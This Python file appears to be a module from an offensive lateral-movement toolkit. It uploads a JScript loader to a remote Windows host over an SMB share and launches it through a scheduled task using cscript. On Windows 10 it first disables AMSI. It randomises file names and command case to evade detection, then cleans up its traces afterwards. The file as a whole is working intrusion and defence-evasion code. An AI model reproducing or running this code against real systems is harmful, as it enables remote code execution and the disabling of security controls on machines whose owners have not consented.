# -*- coding: UTF-8 -*-

import logging
import os
import time

from framework import utils
from framework.connector import delete_file
from framework.connector import init_smb_connection
from framework.connector import log_smb_info
from framework.connector import upload_file_with_data
from framework.helpers import ScheduleTaskHelper
from framework.pokeball import BasePokeBall


class PokeBall(BasePokeBall):
    desc = "Schedule task + cscript.exe + JScript (7+)"

    local_loader_path = None

    tree = None
    loader_name = None
    loader_uploaded = False
    run_cscript = False

    is_win10 = True
    disabled_amsi = False

    def init(self):
        self.payload_path = os.path.join(self.opts["data"], "payload", "pikachu.bin")
        if not os.path.exists(self.payload_path):
            raise Exception("{} does not existed".format(self.payload_path))
        self.local_loader_path = os.path.join(self.opts["data"], "loader", "jscript.js")
        if not os.path.exists(self.local_loader_path):
            raise Exception("{} does not existed".format(self.local_loader_path))

        self.smb_conn = init_smb_connection(self.opts)
        log_smb_info(self.smb_conn)

        self.helper = ScheduleTaskHelper(self.opts, self.smb_conn)
        self.helper.init()

    def delivery_loader(self):
        try:
            if self.smb_conn.getServerOSMajor() < 10:
                self.is_win10 = False
        except:
            pass

        self.tree = utils.get_writeable_share(self.opts, self.smb_conn)
        if self.tree is None:
            raise Exception("Cannot find any writeable share folder")

        with open(self.local_loader_path, 'rb') as f:
            content = f.read()
        content = content.replace('PIPE_NAME_IS_HERE', self.pipe_name)
        content = utils.get_auto_environment_js(self.opts) + content
        self.loader_name = "{0}.{1}".format(utils.get_random_name(), utils.get_random_extension())
        upload_file_with_data(content, self.smb_conn, self.tree, self.loader_name)
        self.loader_uploaded = True

        if self.is_win10:
            try:
                command = utils.command_disable_amsi_script()
                self.helper.execute_command(command)
                logging.info("Disabled AMSI: {}".format(command))
                self.disabled_amsi = True
            except Exception as e:
                logging.error("Error in trying to disable AMSI: {}".format(e))

        command = '{0} "{1}\\{2}"'.format(
            utils.random_case("start /B cscript //E:JScript"), utils.resolve_path(self.smb_conn, self.tree),
            self.loader_name)
        logging.info("Executing: {}".format(command))
        self.helper.execute_command(command)
        self.run_cscript = True
        time.sleep(2)

    def clean_up(self):
        if self.run_cscript:
            try:
                command = "wmic process where \"name='cscript.exe' " \
                          "and commandline like '%{}%'\" " \
                          "call terminate".format(self.loader_name)
                command = utils.random_case(command)
                self.helper.execute_command(command)
            except Exception as e:
                logging.error(e)

        if self.is_win10:
            if self.disabled_amsi:
                try:
                    command = utils.command_enable_amsi_script()
                    self.helper.execute_command(command)
                except Exception as e:
                    logging.error(e)

        if self.loader_uploaded:
            try:
                delete_file(self.smb_conn, self.tree, self.loader_name)
            except Exception as e:
                logging.error(e)
        self.helper.clean_up()
